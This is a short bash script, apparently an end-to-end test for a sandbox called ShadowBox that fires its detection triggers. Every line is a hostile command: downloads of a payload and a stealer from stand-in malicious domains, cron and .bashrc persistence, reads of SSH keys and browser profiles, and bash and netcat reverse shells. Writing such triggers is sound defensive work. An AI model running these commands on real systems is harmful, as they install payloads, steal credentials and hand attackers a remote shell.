#!/bin/bash
# ShadowBox E2E Test Script

# Downloader intent triggers
curl http://malicious-domain.com/payload.sh -o /tmp/payload.sh
wget http://backup-domain.net/stealer.py

# File operation / permission changes
chmod +x /tmp/payload.sh

# Persistence triggers
crontab -l | { cat; echo "* * * * * /tmp/payload.sh"; } | crontab -
echo "python3 /tmp/payload.sh &" >> ~/.bashrc

# Credential theft triggers
cat ~/.ssh/id_rsa
cat ~/.mozilla/firefox/profiles.ini

# Remote C2 / Reverse shell triggers
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
nc -e /bin/sh 192.168.1.100 8888
